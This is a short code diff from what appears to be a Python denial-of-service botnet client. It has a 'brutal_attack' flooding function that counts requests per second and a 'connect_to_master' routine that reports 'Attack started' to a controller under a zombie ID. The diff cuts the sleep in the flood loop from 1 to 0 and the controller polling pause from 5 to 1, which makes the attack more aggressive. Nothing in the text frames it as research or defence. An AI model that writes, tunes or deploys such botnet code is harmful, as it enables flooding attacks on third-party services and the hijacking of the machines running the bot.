@@ -91,7 +91,7 @@ def brutal_attack(target_ip, target_port, duration):
         if elapsed > 1:
             rps = counters['total'] / elapsed
             log(f"📊 {int(elapsed)}s: {counters['total']:,} reqs | {rps:,.0f} RPS")
-        time.sleep(1)
+        time.sleep(0)
     
     # FINALIZAR
     for t in threads:
@@ -168,7 +168,7 @@ def connect_to_master():
                             sock.send(f"REPORT|Attack started|{ZOMBIE_ID}\n".encode())
                     
                     # Pequeña pausa para no saturar
-                    time.sleep(5)
+                    time.sleep(1)
                     
                 except socket.timeout:
                     continue
